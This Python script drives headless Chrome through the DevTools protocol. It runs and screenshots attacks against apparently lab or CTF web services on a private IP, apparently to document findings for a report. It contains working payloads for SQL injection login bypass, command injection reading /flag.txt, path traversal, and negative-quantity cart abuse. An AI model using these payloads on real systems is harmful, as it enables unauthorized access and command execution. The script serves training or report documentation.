import json, subprocess, time, base64, os, urllib.request
import websocket

CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
OUT = r"D:\Wank\laporan\laporangenerator\assets\ss"
PROFILE = r"C:\Users\MSI\AppData\Local\Temp\opencode\cdp_profile"
PORT = 9222

proc = subprocess.Popen([
    CHROME, "--headless=new", f"--remote-debugging-port={PORT}",
    f"--user-data-dir={PROFILE}", "--window-size=1400,1400",
    "--hide-scrollbars", "--disable-gpu", "--no-first-run", "--remote-allow-origins=*",
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(3)

def first_ws():
    with urllib.request.urlopen(f"http://127.0.0.1:{PORT}/json") as r:
        tabs = json.load(r)
    for t in tabs:
        if t["type"] == "page":
            return t["webSocketDebuggerUrl"]

class CDP:
    def __init__(self, ws_url):
        self.ws = websocket.create_connection(ws_url, max_size=50_000_000)
        self.id = 0
    def call(self, method, params=None):
        self.id += 1
        self.ws.send(json.dumps({"id": self.id, "method": method, "params": params or {}}))
        while True:
            msg = json.loads(self.ws.recv())
            if msg.get("id") == self.id:
                return msg.get("result", {})
    def nav(self, url, wait=2.2):
        self.call("Page.navigate", {"url": url}); time.sleep(wait)
    def js(self, expr, wait=2.0):
        r = self.call("Runtime.evaluate", {"expression": expr, "awaitPromise": False})
        time.sleep(wait); return r
    def shot(self, path):
        r = self.call("Page.captureScreenshot", {"format": "png", "captureBeyondViewport": True})
        with open(path, "wb") as f: f.write(base64.b64decode(r["data"]))
        print("saved", path)

cdp = CDP(first_ws())
os.makedirs(OUT, exist_ok=True)

def p(port): return f"http://172.16.92.212:{port}"

# ---------- 5009 ----------
cdp.nav(p(5009))
cdp.shot(f"{OUT}\\5009_login_page.png")
body = "username=admin%27+OR+%271%27%3D%271%27+--+-&password=x"
cdp.js(f"fetch(location.href,{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded'}},body:'{body}'}}).then(r=>r.text()).then(t=>{{document.open();document.write(t);document.close();}})", 3)
cdp.shot(f"{OUT}\\5009_sqli_success.png")

# ---------- 5010 ----------
cdp.nav(p(5010))
cdp.shot(f"{OUT}\\5010_ping_page.png")
body = "host=127.0.0.1%3B+cat+%2Fflag.txt"
cdp.js(f"fetch(location.href,{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded'}},body:'{body}'}}).then(r=>r.text()).then(t=>{{document.open();document.write(t);document.close();}})", 3)
cdp.shot(f"{OUT}\\5010_cmd_injection.png")

# ---------- 5011 ----------
cdp.nav(p(5011))
cdp.shot(f"{OUT}\\5011_portal.png")
cdp.nav(p(5011) + "/view?page=../config", 2.2)
cdp.shot(f"{OUT}\\5011_lfi_config.png")

# ---------- 5012 ----------
cdp.nav(p(5012))
cdp.shot(f"{OUT}\\5012_guestbook.png")
cdp.nav(p(5012) + "/steal", 3)
cdp.shot(f"{OUT}\\5012_steal_log.png")

# ---------- 5013 ----------
cdp.nav(p(5013))
cdp.js("fetch('/add_to_cart',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'product_id=2&quantity=-1'}).then(()=>location.href='/cart')", 3)
cdp.shot(f"{OUT}\\5013_negative_cart.png")
cdp.js("fetch('/checkout',{method:'POST'}).then(r=>r.text()).then(t=>{document.open();document.write(t);document.close();})", 3)
cdp.shot(f"{OUT}\\5013_checkout_refund.png")
cdp.js("fetch('/add_to_cart',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'product_id=2&quantity=1'}).then(()=>fetch('/checkout',{method:'POST'}).then(r=>r.text()).then(t=>{document.open();document.write(t);document.close();}))", 4)
cdp.shot(f"{OUT}\\5013_flag_order.png")

cdp.call("Browser.close") if False else None
try:
    cdp.ws.close()
except Exception: pass
proc.terminate()
print("DONE")
